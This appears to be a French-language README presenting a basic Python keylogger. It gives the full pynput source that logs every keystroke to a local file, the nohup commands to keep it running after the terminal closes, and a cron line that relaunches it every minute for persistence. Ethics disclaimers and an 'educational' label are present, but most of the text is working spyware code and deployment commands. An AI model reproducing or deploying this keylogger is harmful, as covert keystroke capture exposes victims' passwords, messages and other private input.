# keylogger-


# 📄 Rapport : Création et Lancement d'un Keylogger en Arrière-plan avec `nohup`

---

## 📌 Objectif
Ce rapport vise à expliquer la **création d'un keylogger basique en Python** et son lancement en arrière-plan sur un système Linux en utilisant la commande `nohup`. L'objectif est de permettre au keylogger de rester actif même après la fermeture du terminal, garantissant ainsi la capture continue des frappes.

---

## 🛠️ **1. Introduction**

Un keylogger est un programme qui enregistre les frappes effectuées par l'utilisateur sur un clavier. Dans ce rapport, nous allons aborder :

1. **La création d'un keylogger simple avec Python.**
2. **Son lancement en arrière-plan en utilisant `nohup`.**

⚠️ **Éthique :** L'utilisation d'un keylogger peut être illégale dans certaines juridictions si elle est utilisée sans le consentement explicite des utilisateurs. Ce rapport est destiné uniquement à des fins éducatives.

---

## 🏗️ **2. Création du Keylogger**

### 📄 **2.1. Code Source**

Pour créer un keylogger simple, nous utilisons le module `pynput` qui permet de capturer les frappes (keypress) d'un clavier.

```python
from pynput.keyboard import Listener

# Fichier pour enregistrer les frappes
log_file = "keylogger.txt"

def on_press(key):
    try:
        # Enregistre la touche pressée
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Cas des touches spéciales (Shift, Ctrl, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Détecter les frappes
with Listener(on_press=on_press) as listener:
    listener.join()
```

---

### 🖥️ Explications du Code
1. **Importation de `Listener` :**  
   - `from pynput.keyboard import Listener`
   Le module `pynput.keyboard.Listener` écoute les frappes.

2. **Fonction `on_press` :**  
   - Captures normales : `key.char`
   - Captures des touches spéciales : `"[{key}]"`

3. **Écoute des frappes :**  
   - `with Listener(on_press=on_press) as listener:`  
   Permet de démarrer l'écoute des frappes.

---

## 🚀 **3. Lancer le Keylogger en Arrière-plan avec `nohup`**

La commande `nohup` est utilisée pour permettre à un processus de s'exécuter en arrière-plan même après la fermeture du terminal. C'est la meilleure pratique pour que le processus reste actif.

### 📌 **Commandes**

1. **Exécution avec `nohup` :**
   ```bash
   nohup python3 keylogger.py &
   ```

   - **`nohup` :** Permet au processus de continuer à s'exécuter même après la déconnexion ou la fermeture du terminal.
   - **`&` :** Permet de lancer le processus en arrière-plan.

---

### 🔎 **Vérification du processus**

Pour vérifier que le keylogger est bien en cours d'exécution après la commande :

```bash
ps aux | grep keylogger.py
```

---

### ❌ **Pour arrêter le processus**
Si vous avez besoin d'arrêter le keylogger, utilisez la commande suivante :

```bash
pkill -f keylogger.py
```

---

## 🛠️ **4. Éléments Techniques**

1. **Fichier `keylogger.txt` :**  
   Toutes les frappes capturées sont enregistrées dans ce fichier.

2. **`nohup.out` :**  
   Par défaut, la sortie standard est redirigée vers le fichier `nohup.out`. Si vous souhaitez spécifier un autre fichier de log, vous pouvez faire comme suit :
   ```bash
   nohup python3 keylogger.py > output.log &
   ```

3. **Permissions :**  
   Assurez-vous que l'utilisateur a bien les permissions nécessaires pour lancer `nohup`.

---

## 🚩 **5. Limites et Considérations**

### 🚩 **1. Éthique et Légalité**
Créer et déployer un keylogger sur une machine sans le consentement de l'utilisateur est **illégal dans la majorité des pays**.

- **Utilisation uniquement dans un contexte éthique et éducatif.**
- **Consentement préalable requis dans le cas d'applications réelles.**

---

### 🚩 **2. Redémarrages**
Si le processus est accidentellement fermé, utilisez `cron` pour surveiller et redémarrer le keylogger automatiquement.

Exemple avec `cron` :
```bash
crontab -e
```
Ajoutez cette ligne pour lancer le keylogger toutes les minutes :
```cron
* * * * * nohup python3 /home/kali/Desktop/keylogger.py &
```

---

## 🎓 **6. Conclusion**

Dans ce rapport, nous avons abordé la création d'un keylogger simple avec Python et son lancement en arrière-plan avec `nohup`. Cette approche garantit que le processus reste actif même après la fermeture du terminal.

Les systèmes Linux permettent de gérer ces processus avec des commandes comme `nohup` et `systemd` pour assurer un fonctionnement fiable.

⚠️ **Rappel : Veillez toujours à respecter la législation en vigueur lorsque vous effectuez ce type de tests ou déploiements.**

---

📌 **Fichier clé :**  
- `keylogger.py`

📌 **Commandes clés pour le lancement :**
```bash
nohup python3 keylogger.py &
ps aux | grep keylogger.py
```

---

**Bonne pratique :** Pour des tests ou de la recherche, configurez toujours un environnement virtuel sécurisé pour éviter tout risque.

---

